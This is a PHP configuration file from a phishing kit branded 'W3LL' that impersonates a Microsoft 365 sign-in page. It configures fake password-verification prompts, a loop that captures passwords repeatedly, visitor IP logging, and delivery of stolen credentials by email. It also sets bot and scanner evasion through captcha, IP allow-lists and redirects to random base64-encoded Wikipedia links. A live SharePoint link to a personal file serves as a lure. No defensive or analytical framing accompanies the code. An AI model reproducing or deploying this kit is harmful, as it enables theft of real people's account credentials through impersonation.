<?php
error_reporting(E_ALL);
require 'email.php';
@session_start();
$captha = 0; //set to 0 to turn off captha & set to 1 to turn on!
$sitekey = 'SITE KEY HERE'; //Set your google V3 recaptha sitekey here
$secretkey = 'SECRET KEY HERE'; //Set your google V3 recaptha secret here
$token = 'TOKEN HERE';
$toEmail = $to;
$fromemail = "bot@example.com";
$fromname = "Logs";
$subjectTitle = "| [GIFT FROM W3LL]";
$officeLink = "https://hoskins10-my.sharepoint.com/:b:/g/personal/simone_ezipmortgage_com/EW3s7A_qnc5Hr05aGVwniQsB2ZE6a93lKg2Dh0dyfCynrg?e=5c2GHR";
$link = array("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfMzY1","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9MaXN0X29mX01pY3Jvc29mdF8zNjVfQXBwbGljYXRpb25z","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DYXRlZ29yeTpPZmZpY2VfMzY1","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2lkLndpa2lwZWRpYS5vcmcvd2lraS9CZXJrYXM6TG9nb19NaWNyb3NvZnRfT2ZmaWNlXzM2NV8oMjAxMy0yMDE5KS5zdmc=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfT2ZmaWNlX01peA==","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfRXhjaGFuZ2VfU2VydmVy","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbF9jbGllbnQ=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbA==","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DbGllbnRfYWNjZXNzX2xpY2Vuc2U=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9XaW5kb3dzX1NlcnZlcl8yMDE2","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9XaW5kb3dzX1NlcnZlcl8yMDE5","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9JbnRlcm5ldF9FeHBsb3Jlcl8xMQ==");
$random = rand(0, 11);
$FailRedirect = base64_decode($link[$random]);
$AutoGrab = true;//if auto grab set to false you can open direct without put email in link like:domain.com/off365
$Resetlogs = true; //clears all logs
$ResetAllow = true; //reset list of blocked ips and emails and regions (allow all except bot)
$onlylistemails = false; //allow only a list of emails (put emails in EMAILS.txt. Each email in line)
$onlyonetimeuse = false; //true will make page become died after the user put all passwords 
$limitedarea = false;//"^196.*.*.*,^41.*.*.*,160.*.*.*";//for limited ip or country-- put here your allowed ips and ip ranges//exemple:"^38.100.200.*,39.100.1.1"
$base64encodeData = true;//true OR false(using base64encoded email value in link or not)
$randfirstpart = 'authorize_client_id=00000002-0000-0ff1-ce00-000000000000'; //Change this word to edit the first part within link
$passloopNumber = 2; //1 to 5
$firstmsg= 1; // false/1/2/3/4
//$firstmsg= false: (disabled)
//$firstmsg= 1: (Because you're accessing sensitive info, you need to verify your password)
//$firstmsg= 2: (Enter password to access your office Mail)
//$firstmsg= 3: (Because you're accessing sensitive info, you need to verify your password to access your Voicemail)
//$firstmsg= 4: (Verify your password to access your Microsoft OneDrive)
$error = "Sign in attempt timeout, verify your password";
$error2 =  $error3  =  $error4 = $error5 = "";
$successMsgTitle = 'Success';
$successMsg = 'Successfully confirmed<br/>Redirecting to Document...';
$successMsgTimeout = '3000';
$visitorfileName = "power.txt";//Name of file to save all visitors IP logs; may contain also bot IP logs. replace it with "false" to stop it.
$logsfileName = "ranger.txt";//Name of file to save real visitors IP logs; replace it with "false" to stop it
$PageLink = "W3LL";//This name will shown in logs info. Put "false" (to disable it), "true" (to use url as name) or put custom name like:("my first page")

$TitlesArray=array("verify your account","Verify your identity","verify your credentials","verify your informations","verify your email","verify your login","confirm your account","confirm your identity","confirm your credentials","confirm your information","confirm your email","confirm your login","login to your account","signin to your account","connect your account");
$fixIndex = false; //false or true --- activate it only if you get error related with index.php redirecting

define('SITE_KEY', $sitekey);
define('SECRET_KEY', $secretkey);

function getCaptcha($SecretKey){
    $Response = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".SECRET_KEY."&response={$SecretKey}");
    $Return = json_decode($Response);
    return $Return;
}
    

?>